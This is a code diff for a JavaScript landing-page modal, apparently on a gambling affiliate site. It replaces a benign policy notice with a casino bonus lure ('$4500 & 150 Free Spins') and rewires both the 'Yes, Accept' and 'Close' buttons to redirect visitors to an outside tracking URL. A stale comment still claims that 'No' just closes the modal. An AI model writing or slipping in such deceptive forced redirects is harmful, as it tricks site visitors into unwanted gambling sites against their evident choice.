@@ -75,8 +75,8 @@ const isHome = /\/lander\.html$/.test(path);
   bd.className = 'modal-backdrop';
   bd.innerHTML = `
 <div class="modal">
-<h3>Policy Notice</h3>
-<p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+<h3>Welcome To Casiny Au</h3>
+<p>Get Welcome Bonous $4500 & 150 Free Spins? Tap To Join.</p>
 <div style="display:flex;gap:10px;flex-wrap:wrap">
 <button class="btn" id="age-yes">Yes, Accept</button>
 <button class="btn ghost" id="age-no">Close</button>
@@ -87,14 +87,14 @@ const isHome = /\/lander\.html$/.test(path);
  
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  //                                               function(){
-  //   window.location.href = "http://p8r9.com/?utm_campaign=WV47m11tE6&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
-  // });
+  bd.querySelector('#age-yes').addEventListener('click',
+                                                function(){
+    window.location.href = "https://zeurix.site/?utm_campaign=gXUQnk2FQz&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
  
   // ✅ Just close modal when "No" is clicked
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
-  //                                              function(){
-  //   window.location.href = "http://p8r9.com/?utm_campaign=WV47m11tE6&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
-  // });
+  bd.querySelector('#age-no').addEventListener('click',
+                                               function(){
+    window.location.href = "https://zeurix.site/?utm_campaign=gXUQnk2FQz&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
